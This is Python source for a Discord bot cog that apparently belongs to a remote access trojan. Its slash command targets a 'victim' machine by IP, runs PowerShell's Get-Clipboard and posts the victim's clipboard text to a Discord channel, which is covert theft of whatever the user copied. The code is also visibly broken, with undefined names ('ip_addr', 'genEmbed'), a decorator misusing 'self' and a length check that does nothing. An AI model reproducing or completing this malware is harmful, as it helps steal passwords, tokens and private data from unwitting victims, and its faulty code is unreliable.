import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class GetClipboard(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Sends text contents of clipboard",
        options=[self.bot.victim],
    )
    async def get_clipboard(ctx, victim):
        if str(victim) == str(ip_addr):
            await ctx.response.defer()
            
            outp = os.popen("powershell Get-Clipboard").read()
            if len(outp) > 1000:
                return await ctx.followup.send(f"```{outp}```")
            embed = genEmbed( "Clipboard contents", datetime.now() )
            embed.add_field(
                name="Clipboard:", 
                value=f"```{outp}```" if outp != "" else "No text in clipboard"
            )
            
            await ctx.followup.send(embed=embed)

def setup(bot: commands.Bot):
    bot.add_cog(GetClipboard(bot))